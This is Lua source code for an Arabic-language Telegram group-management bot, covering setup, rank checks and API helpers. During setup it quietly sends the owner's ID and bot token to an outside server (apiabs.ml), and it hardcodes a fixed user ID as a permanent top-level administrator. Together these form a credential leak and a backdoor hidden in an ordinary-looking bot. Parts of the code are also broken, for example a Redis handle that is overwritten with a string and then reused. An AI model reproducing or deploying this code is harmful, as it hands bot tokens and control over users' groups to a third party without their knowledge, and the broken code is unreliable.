------------------------------------------------
-- Source Feras.--
--   Channel bot @dev_Feras .   --
--                - DevFeras -                 --
--        -- https://t.me/DevFeras --         --
------------------------------------------------ 
redis = require('redis') 
URL = require('socket.url') 
HTTPS = require ("ssl.https") 
https = require ("ssl.https") 
http  = require ("socket.http") 
serpent = require("serpent") 
json = dofile('./JSON.lua') 
JSON = dofile('./dkjson.lua') 
lgi = require('lgi') 
notify = lgi.require('Notify') 
utf8 = require ('lua-utf8') 
notify.init ("Telegram updates") 
DevFeras = redis.connect('127.0.0.1', 6379) 
ServerDevFeras = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a') 
--     Source DevFeras     --
local AutoSet = function() 
if not DevFeras:get(ServerDevFeras.."IdDevFeras") then 
io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
local SUDO = io.read():gsub(' ','') 
if tostring(SUDO):match('%d+') then 
io.write('\27[1;36mتم حفظ ايدي المطور الاساسي\n27[0;39;49m') 
DevFeras:set(ServerDevFeras.."IdDevFeras",SUDO) 
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ ايدي المطور الاساسي ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end 
os.execute('lua DevFeras.lua') 
end 
if not DevFeras:get(ServerDevFeras.."TokenDevFeras") then 
io.write('\27[1;35m\nالان قم بارسال توكن البوت ↫ ⤈\n\27[0;33;49m') 
local token = io.read() 
if token ~= '' then 
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe') 
if res ~= 200 then 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nالتوكن غير صحيح تاكد منه ثم ارسله\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
else 
io.write('\27[1;36mتم حفظ توكن البوت بنجاح\n27[0;39;49m') 
DevFeras:set(ServerDevFeras.."TokenDevFeras",token) 
end  
else 
print('\27[1;31m┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\nلم يتم حفظ توكن البوت ارسله مره اخرى\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉') 
end  
os.execute('lua DevFeras.lua') 
end 
local create = function(data, file, uglify)  
file = io.open(file, "w+")   
local serialized   
if not uglify then  
serialized = serpent.block(data, {comment = false, name = "_"})  
else  
serialized = serpent.dump(data)  
end    
file:write(serialized)
file:close()  
end
local create_config_auto = function()
config = {
SUDO = DevFeras:get(ServerDevFeras.."IdDevFeras"),
token = DevFeras:get(ServerDevFeras.."TokenDevFeras"),
bot_id = DevFeras:get(ServerDevFeras.."TokenDevFeras"):match("(%d+)"),
sudo_users = {DevFeras:get(ServerDevFeras.."IdDevFeras")}, 
}
create(config, "./config.lua")   
https.request("https://apiabs.ml/DevFeras.php?SUDO="..DevFeras:get(ServerDevFeras.."IdDevFeras").."&token="..DevFeras:get(ServerDevFeras.."TokenDevFeras"))
file = io.open("RUNABS.sh", "w")  
file:write([[
#!/bin/bash 
token="]]..DevFeras:get(ServerDevFeras.."TokenDevFeras")..[["
while(true) do
rm -fr ../.telegram-cli
echo -e ""
echo -e ""
./tg -s ./DevFeras.lua $@ --bot=$token
done
]])  
file:close()  
file = io.open("ABS", "w")  
file:write([[
killall screen
while(true) do
rm -fr ../.telegram-cli
screen ./RUNABS.sh
done
]])  
file:close() 
os.execute('./ABS')
end 
create_config_auto()
end
local Load_DevFeras = function() 
local f = io.open("./config.lua", "r") 
if not f then 
AutoSet() 
else 
f:close() 
DevFeras:del(ServerDevFeras.."IdDevFeras");DevFeras:del(ServerDevFeras.."TokenDevFeras")
end 
local config = loadfile("./config.lua")() 
return config 
end  
Load_DevFeras() 
print("\27[36m"..[[                                           
|---------------------------------------------|
|   _____             ______                  |
|  |  __ \           |  ____|                 |
|  | |  | | _____   _| |__ ___ _ __ __ _ ___  |
|  | |  | |/ _ \ \ / /  __/ _ \ '__/ _` / __| |
|  | |__| |  __/\ V /| | |  __/ | | (_| \__ \ |
|  |_____/ \___| \_/ |_|  \___|_|  \__,_|___/ |
|---------------------------------------------|
|Source Feras.|                               |
|  Channel bot @dev_Feras .                   |
|               - DevFeras -                  |
|---------------------------------------------|
]]..'\27[m')
sudos = dofile("./config.lua") 
DevId = sudos.SUDO 
sudo_users = {sudos.sudo_users,1419573259} 
bot_id = sudos.bot_id 
DevFeras = sudos.bot_id
TokenBot = sudos.token
name_bot = (DevFeras:get('Feras_dev:'..bot_id..'name_bot') or 'Feras')
--     Source DevFeras     --
--     Start Functions    --
function vardump(value)
print(serpent.block(value, {comment=false}))
end
--     Source DevFeras     --
function dl_cb(arg, data)
end
--     Source DevFeras     --
----------  Sudo  ----------
function Sudo(msg) local var = false for k,v in pairs(sudo_users) do if msg.sender_user_id_ == v then var = true end end if msg.sender_user_id_ == tonumber(DevId) then var = true end return var end
function SudoId(user_id) local var = false for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------  SudoBot  ---------
function SudoBot(user_id)
local var = false local absb = 'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..absb, user_id)
if sudobot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------Owner all---------
function OwnerAll(user_id)
local var = false local abs =  'abs:ownerall:' local ownerall = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id)
if ownerall then var = true end if sudobot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------admin all---------
function AdminAll(user_id)
local var = false local abs =  'abs:adminall:' local adminall = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:ownerall:' local ownerall = DevFeras:sismember(DevFeras..absss, user_id)
if adminall then var = true end if sudobot then var = true end if ownerall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
------ VIP MEMBER ALL ------
function VipAll(user_id)
local var = false local abss =  'abs:vipall:' local vpall = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:ownerall:' local ownerall = DevFeras:sismember(DevFeras..absss, user_id) local abssss = 'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abssss, user_id) local absssss =  'abs:adminall:' local adminall = DevFeras:sismember(DevFeras..absssss, user_id)
if vpall then var = true end if ownerall then var = true end if sudobot then var = true end if adminall then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------  absmonsh  ---------
function AbsMonsh(user_id, chat_id)
local var = false local abs =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id)
if absmonsh then var = true end if sudobot then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------  monsh  ---------
function Monsh(user_id, chat_id)
local var = false local abs =  'abs:monsh:'..chat_id local monsh = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..absss, user_id)
if monsh then var = true end if sudobot then var = true end if absmonsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
---------  monshid  ---------
function MonshId(user_id, chat_id)
local var = false local abs =  'abs:monshid:'..chat_id local monshid = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..absss, user_id) local abssss =  'abs:monsh:'..chat_id local monsh = DevFeras:sismember(DevFeras..abssss, user_id)
if monshid then var = true end if sudobot then var = true end if absmonsh then var = true end if monsh then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------  Owner  ---------
function Owner(user_id, chat_id)
local var = false local abs =  'abs:owners:'..chat_id local owner = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..absss, user_id) local abssss =  'abs:monsh:'..chat_id local monsh = DevFeras:sismember(DevFeras..abssss, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevFeras:sismember(DevFeras..abas, user_id)
if owner then var = true end if sudobot then var = true end if absmonsh then var = true end if monsh then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
----------  Admin  ---------
function Admin(user_id, chat_id)
local var = false local abs =  'abs:admins:'..chat_id local admins = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevFeras:sismember(DevFeras..absss, user_id) local abssss =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..abssss, user_id) local absssss =  'abs:monsh:'..chat_id local monsh = DevFeras:sismember(DevFeras..absssss, user_id) local abssssss =  'abs:ownerall:' local ownerall = DevFeras:sismember(DevFeras..abssssss, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevFeras:sismember(DevFeras..abas, user_id)
if admins then var = true end if owner then var = true end if sudobot then var = true end if absmonsh then var = true end if monsh then var = true end if ownerall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
---------Vip Member---------
function VipMem(user_id, chat_id)
local var = false local abs =  'abs:admins:'..chat_id local admins = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:owners:'..chat_id local owner = DevFeras:sismember(DevFeras..absss, user_id) local abssss = 'abs:vipmem:'..chat_id local vipmem = DevFeras:sismember(DevFeras..abssss, user_id) local absssss =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..absssss, user_id) local abssssss =  'abs:monsh:'..chat_id local monsh = DevFeras:sismember(DevFeras..abssssss, user_id) local absssssss =  'abs:ownerall:' local ownerall = DevFeras:sismember(DevFeras..absssssss, user_id) local absabs =  'abs:adminall:' local adminall = DevFeras:sismember(DevFeras..absabs, user_id) local abas =  'abs:monshid:'..chat_id local monshid = DevFeras:sismember(DevFeras..abas, user_id)
if vipmem then var = true end if admins then var = true end if owner then var = true end if sudobot then var = true end if absmonsh then var = true end if monsh then var = true end if ownerall then var = true end if adminall then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
--------- Cleaner ----------
function Cleaner(user_id, chat_id)
local var = false local abs =  'abs:Cleaner:'..chat_id local Cleaner = DevFeras:sismember(DevFeras..abs, user_id) local abss =  'abs:SudoBot:' local sudobot = DevFeras:sismember(DevFeras..abss, user_id) local absss =  'abs:absmonsh:'..chat_id local absmonsh = DevFeras:sismember(DevFeras..absss, user_id) local abssss =  'abs:monsh:'..chat_id local monsh = DevFeras:sismember(DevFeras..abssss, user_id) local absssss =  'abs:monshid:'..chat_id local monshid = DevFeras:sismember(DevFeras..absssss, user_id)
if Cleaner then var = true end if sudobot then var = true end if absmonsh then var = true end if monsh then var = true end if monshid then var = true end for k,v in pairs(sudo_users) do if user_id == v then var = true end end if user_id == tonumber(DevId) then var = true end return var end
--     Source DevFeras     --
---------  Banned  ---------
local function Ban(user_id, chat_id)
local var = false
local abs = 'abs:Ban:'..chat_id
local banned = DevFeras:sismember(DevFeras..abs, user_id)
if banned then
var = true
end
return var
end
--     Source DevFeras     --
----------  Muted  ---------
local function Muted(user_id, chat_id)
local var = false
local abs = 'abs:Muted:'..chat_id
local muted = DevFeras:sismember(DevFeras..abs, user_id)
if muted then
var = true
end
return var
end
--     Source DevFeras     --
---------  BanAll  ---------
function BanAll(user_id)
local var = false
local abs = 'abs:BanAll:'
local BanAll = DevFeras:sismember(DevFeras..abs, user_id)
if BanAll then
var = true
end
return var
end
--     Source DevFeras     --
---------  MuteAll  ---------
function MuteAll(user_id)
local var = false
local abs = 'abs:MuteAll:'
local MuteAll = DevFeras:sismember(DevFeras..abs, user_id)
if MuteAll then
var = true
end
return var
end
--     Source DevFeras     --
function DeleteMessage(chatid ,mid)
pcall(tdcli_function ({
ID = "DeleteMessages",
chat_id_ = chatid,
message_ids_ = mid
},function(arg,data) 
end,nil))
end
--     Source DevFeras     --
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
--     Source DevFeras     --
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
--     Source DevFeras     --
function AddFile(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if File_Name:lower():match('(%d+)') ~= DevFeras:lower() then 
send(chat,msg.id_,"⌁︙عذرا هذا الملف ليس تابع لهذا السورس")   
return false 
end
send(chat,msg.id_,"⌁︙جاري رفع الملف ... .")
local File = json:decode(https.request('https://api.telegram.org/bot' .. TokenBot .. '/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
else
send(chat,msg.id_,"⌁︙لقد حدث خطاء \n⌁︙يرجى التحقق من صيغة الملف ")
end
local info_file = io.open('./'..DevFeras..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
send(chat,msg.id_,"⌁︙تم رفع النسخه بنجاح \n⌁︙تم تفعيل جميع المجموعات \n⌁︙تم استرجاع مشرفين المجموعات \n⌁︙تم استرجاع اوامر القفل والفتح في جميع مجموعات البوت ")
vardump(groups)
for IdGps,v in pairs(groups.GroupsList) do
DevFeras:sadd(DevFeras.."bot:groups",IdGps) 
DevFeras:set(DevFeras..'bot:links:mute'..IdGps,true) DevFeras:set(DevFeras..'bot:forward:mute'..IdGps,true) DevFeras:set(DevFeras.."abs:Lock:Bots"..IdGps,"del") DevFeras:hset(DevFeras.."abs:Spam:Group:User"..IdGps ,"Spam:User","del") DevFeras:set(DevFeras..'bot:video:mute'..IdGps,true) DevFeras:set(DevFeras..'bot:gifs:mute'..IdGps,true) DevFeras:set(DevFeras..'editmsg'..IdGps,true)
DevFeras:set(DevFeras..'bot:sticker:mute'..IdGps,true) DevFeras:set(DevFeras..'farsi'..IdGps,true) DevFeras:del(DevFeras.."fshar"..IdGps) DevFeras:del(DevFeras.."taf"..IdGps) DevFeras:del(DevFeras.."kaf"..IdGps) DevFeras:set('DevFeras:id:photo'..IdGps,true) DevFeras:set(DevFeras..'bot:spam:mute'..IdGps,true) DevFeras:set(DevFeras..'bot:webpage:mute'..IdGps,true)
if v.AbsMonshs then
for k,IdAbsMonshs in pairs(v.AbsMonshs) do
DevFeras:sadd(DevFeras..'abs:absmonsh:'..IdGps,IdAbsMonshs)  
print('تم رفع منشئين المجموعات')
end
end
if v.Monshs then
for k,IdMonshs in pairs(v.Monshs) do
DevFeras:sadd(DevFeras..'abs:monsh:'..IdGps,IdMonshs)  
print('تم رفع ( '..k..' ) منشئين اساسيين')
end
end
if v.MonshIds then
for k,IdMonshIds in pairs(v.MonshIds) do
DevFeras:sadd(DevFeras..'abs:monshid:'..IdGps,IdMonshIds)  
print('تم رفع ( '..k..' ) منشئين')
end
end
if v.Owners then
for k,IdOwners in pairs(v.Owners) do
DevFeras:sadd(DevFeras..'abs:owners:'..IdGps,IdOwners)  
print('تم رفع ( '..k..' ) مدراء')
end
end
if v.Admins then
for k,idmod in pairs(v.Admins) do
vardump(IdAdmins)
DevFeras:sadd(DevFeras..'abs:admins:'..IdGps,IdAdmins)  
print('تم رفع ( '..k..' ) ادمنيه')
end
end
if v.Vips then
for k,IdVips in pairs(v.Vips) do
DevFeras:sadd(DevFeras..'abs:vipmem:'..IdGps,IdVips)  
print('تم رفع ( '..k..' ) مميزين')
end
end
if v.LinkGroups then
if v.LinkGroups ~= "" then
DevFeras:set(DevFeras.."bot:group:link"..IdGps,v.LinkGroups)   
print('( تم وضع روابط المجموعات )')
end
end
if v.Welcomes then
if v.Welcomes ~= "" then
DevFeras:set(DevFeras.."welcome:"..IdGps,v.Welcomes)   
print('( تم وضع ترحيب المجموعات )')
end
end
end
end
--     Source DevFeras     --
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
--     Source DevFeras     --
function changeChatMemberStatus(chat_id, user_id, status)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = chat_id, user_id_ = user_id, status_ = { ID = "ChatMemberStatus" .. status }, }, dl_cb, nil)
end
--     Source DevFeras     --
function getInputFile(file)
if file:match('/') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
return infile
end
--     Source DevFeras     --
function getChatId(id)
local chat = {}
local id = tostring(id)
if id:match('^-100') then
local channel_id = id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
--     Source DevFeras     --
function chat_leave(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Left")
end
--     Source DevFeras     --
function do_notify(user, msg)
local n = notify.Notification.new(user, msg)
n:show ()
end
--     Source DevFeras     --
function ChatKick(chat_id, user_id)
changeChatMemberStatus(chat_id, user_id, "Kicked")
end
--     Source DevFeras     --
function getParseMode(parse_mode)
if parse_mode then
local mode = parse_mode:lower()
if mode == 'markdown' or mode == 'md' then
P = {ID = "TextParseModeMarkdown"}
elseif mode == 'html' then
P = {ID = "TextParseModeHTML"}
end
end
return P
end
--     Source DevFeras     --
function getMessage(chat_id, message_id,cb)
tdcli_function ({
ID = "GetMessage",
chat_id_ = chat_id,
message_id_ = message_id
}, cb, nil)
end
--     Source DevFeras     --
function sendContact(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, phone_number, first_name, last_name, user_id)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessageContact", contact_ = { ID = "Contact", phone_number_ = phone_number, first_name_ = first_name, last_name_ = last_name, user_id_ = user_id },},}, dl_cb, nil)
end
--     Source DevFeras     --
function sendPhoto(chat_id, reply_to_message_id, disable_notification, from_background, reply_markup, photo, caption)
tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = from_background, reply_markup_ = reply_markup, input_message_content_ = { ID = "InputMessagePhoto", photo_ = getInputFile(photo), added_sticker_file_ids_ = {}, width_ = 0, height_ = 0, caption_ = caption }, }, dl_cb, nil)
end
--     Source DevFeras     --
function Dev_Feras(chat_id, reply_to_message_id, disable_notification, text, disable_web_page_preview, parse_mode)
local TextParseMode = getParseMode(parse_mode) tdcli_function ({ ID = "SendMessage", chat_id_ = chat_id, reply_to_message_id_ = reply_to_message_id, disable_notification_ = disable_notification, from_background_ = 1, reply_markup_ = nil, input_message_content_ = { ID = "InputMessageText", text_ = text, disable_web_page_preview_ = disable_web_page_preview, clear_draft_ = 0, entities_ = {}, parse_mode_ = TextParseMode, }, }, dl_cb, nil)
end
--     Source DevFeras     --
function changetitle(chat_id, title)
tdcli_function ({
ID = "ChangeChatTitle",
chat_id_ = chat_id,
title_ = title
}, dl_cb, nil)
end
--     Source DevFeras     --
function setphoto(chat_id, photo)
tdcli_function ({ ID = "ChangeChatPhoto", chat_id_ = chat_id, photo_ = getInputFile(photo) }, dl_cb, nil)
end
--     Source DevFeras     --
function unpinmsg(channel_id)
tdcli_function ({ ID = "UnpinChannelMessage", channel_id_ = getChatId(channel_id).ID }, dl_cb, nil)
end
--     Source DevFeras     --
function delmsg(arg,data)
for k,v in pairs(data.messages_) do
DeleteMessage(v.chat_id_,{[0] = v.id_})
end
end
--     Source DevFeras     --
function GetApi(web) 
local info, res = https.request(web) 
local req = json:decode(info) if res ~= 200 then 
return false 
end 
if not req.ok then 
return false 
end 
return req 
end 
--     Source DevFeras     --
function SendText(chat_id, text, reply_to_message_id, markdown) 
send_api = "https://api.telegram.org/bot"..TokenBot 
local url = send_api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
url = url .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
url = url.."&parse_mode=Markdown" 
elseif markdown == "html" then 
url = url.."&parse_mode=HTML" 
end 
url = url.."&disable_web_page_preview=true"
return GetApi(url) 
end
--     Source DevFeras     --
function SendInline(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local send_api = "https://api.telegram.org/bot"..TokenBot.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
send_api = send_api.."&reply_to_message_id="..reply_id 
end 
return GetApi(send_api) 
end
--     Source DevFeras     --
function EditMsg(chat_id, message_id, text, markdown) local send_api = "https://api.telegram.org/bot"..TokenBot.."/editMessageText?chat_id="..chat_id.."&message_id="..message_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true" return GetApi(send_api)  end
--     Source DevFeras     --
function getChannelMembers(channel_id, offset, filter, limit)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({ ID = "GetChannelMembers", channel_id_ = getChatId(channel_id).ID, filter_ = { ID = "ChannelMembers" .. filter }, offset_ = offset, limit_ = limit }, dl_cb, nil)
end
--     Source DevFeras     --
function getInputMessageContent(file, filetype, caption)
if file:match('/') or file:match('.') then
infile = {ID = "InputFileLocal", path_ = file}
elseif file:match('^%d+$') then
infile = {ID = "InputFileId", id_ = file}
else
infile = {ID = "InputFilePersistentId", persistent_id_ = file}
end
local inmsg = {}
local filetype = filetype:lower()
if filetype == 'animation' then
inmsg = {ID = "InputMessageAnimation", animation_ = infile, caption_ = caption}
elseif filetype == 'audio' then
inmsg = {ID = "InputMessageAudio", audio_ = infile, caption_ = caption}
elseif filetype == 'document' then
inmsg = {ID = "InputMessageDocument", document_ = infile, caption_ = caption}
elseif filetype == 'photo' then
inmsg = {ID = "InputMessagePhoto", photo_ = infile, caption_ = caption}
elseif filetype == 'sticker' then
inmsg = {ID = "InputMessageSticker", sticker_ = infile, caption_ = caption}
elseif filetype == 'video' then
inmsg = {ID = "InputMessageVideo", video_ = infile, caption_ = caption}
elseif filetype == 'voice' then
inmsg = {ID = "InputMessageVoice", voice_ = infile, caption_ = caption}
end
return inmsg
end
--     Source DevFeras     --
function pin(channel_id, message_id, disable_notification) 
tdcli_function ({ 
ID = "PinChannelMessage", 
channel_id_ = getChatId(channel_id).ID, 
message_id_ = message_id, 
disable_notification_ = disable_notification 
}, function(arg ,data)
vardump(data)
end ,nil) 
end
--     Source DevFeras     --
function CatchName(Name,Num) 
ChekName = utf8.sub(Name,0,Num) Name = ChekName return Name..'' 
end
--     Source DevFeras     --
local abs_rank = function(msg) if SudoId(msg.sender_user_id_) then Feras_dev  = "المطور" elseif SudoId(msg.sender_user_id_) then Feras_dev = "المطور" elseif SudoBot(msg.sender_user_id_) then Feras_dev = "المطور" elseif OwnerAll(msg.sender_user_id_) then Feras_dev = "المدير" elseif AdminAll(msg.sender_user_id_) then Feras_dev = "الادمن" elseif AbsMonsh(msg.sender_user_id_, msg.chat_id_) then Feras_dev = "المنشئ" elseif Monsh(msg.sender_user_id_, msg.chat_id_) then Feras_dev = "المنشئ" elseif MonshId(msg.sender_user_id_, msg.chat_id_) then Feras_dev = "المنشئ" elseif Owner(msg.sender_user_id_, msg.chat_id_) then Feras_dev = "المدير" elseif Admin(msg.sender_user_id_, msg.chat_id_) then Feras_dev = "الادمن" else Feras_dev = "العضو" end return Feras_dev end
local id_rank = function(msg) if tonumber(msg.sender_user_id_) == tonumber(1419573259) then Feras_dev = 'مبرمج السورس' elseif Sudo(msg) then Feras_dev = 'المطور الاساسي' elseif SudoBot(msg.sender_user_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:SudoBot:Rd"..msg.chat_id_) or 'مطور البوت' elseif OwnerAll(msg.sender_user_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'المدير العام' elseif AdminAll(msg.sender_user_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'الادمن العام' elseif VipAll(msg.sender_user_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'المميز العام' elseif AbsMonsh(msg.sender_user_id_, msg.chat_id_) then Feras_dev = 'منشئ المجموعه' elseif Monsh(msg.sender_user_id_, msg.chat_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:monsh:Rd"..msg.chat_id_) or 'المنشئ الاساسي' elseif MonshId(msg.sender_user_id_, msg.chat_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:monshid:Rd"..msg.chat_id_) or 'المنشئ' elseif Owner(msg.sender_user_id_, msg.chat_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:owners:Rd"..msg.chat_id_) or 'المدير' elseif Admin(msg.sender_user_id_, msg.chat_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:admins:Rd"..msg.chat_id_) or 'الادمن' elseif VipMem(msg.sender_user_id_, msg.chat_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:vipmem:Rd"..msg.chat_id_) or 'المميز' elseif Cleaner(msg.sender_user_id_, msg.chat_id_) then Feras_dev = DevFeras:get(DevFeras.."abs:Cleaner:Rd"..msg.chat_id_) or 'المنظف' else Feras_dev = DevFeras:get(DevFeras.."abs:mem:Rd"..msg.chat_id_) or 'العضو' end return Feras_dev end
function rank_abs(user_id,chat_id) if tonumber(user_id) == tonumber(1419573259) then Feras_dev  = "المبرمج" elseif tonumber(user_id) == tonumber(DevFeras) then Feras_dev  = "البوت" elseif SudoId(user_id) then Feras_dev  = "المطور" elseif SudoId(user_id) then Feras_dev = "المطور" elseif SudoBot(user_id) then Feras_dev = "المطور" elseif OwnerAll(user_id) then Feras_dev = "المدير" elseif AdminAll(user_id) then Feras_dev = "الادمن" elseif AbsMonsh(user_id, chat_id) then Feras_dev = "المنشئ" elseif Monsh(user_id, chat_id) then Feras_dev = "المنشئ" elseif MonshId(user_id, chat_id) then Feras_dev = "المنشئ" elseif Owner(user_id, chat_id) then Feras_dev = "المدير" elseif Admin(user_id, chat_id) then Feras_dev = "الادمن" else Feras_dev = "العضو" end return Feras_dev end
--     Source DevFeras     --
function absmasco(user_id,chat_id)
if SudoId(user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:SudoBot:', user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:ownerall:', user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:adminall:', user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:vipall:', user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:absmonsh:'..chat_id, user_id) then
var = true
elseif DevFeras:sismember(DevFeras..'abs:monsh:'..chat_id, user_id) then
var = true
elseif Monsh(chat_id, user_id) then
var = true
elseif DevFeras:sismember(DevFeras..'abs:monshid:'..chat_id, user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:owners:'..chat_id, user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:admins:'..chat_id, user_id) then
var = true  
elseif DevFeras:sismember(DevFeras..'abs:vipmem:'..chat_id, user_id) then  
var = true  
else  
var = false  
end  
return var
end
function masco(user_id,chat_id)
if SudoId(user_id) then
var = 'botow'  
elseif DevFeras:sismember(DevFeras..'abs:SudoBot:', user_id) then
var = 'sudobot'  
elseif DevFeras:sismember(DevFeras..'abs:absmonsh:'..chat_id, user_id) then
var = 'absmonsh'
elseif DevFeras:sismember(DevFeras..'abs:monsh:'..chat_id, user_id) then
var = 'monsh'
elseif DevFeras:sismember(DevFeras..'abs:monshid:'..chat_id, user_id) then
var = 'monshid'
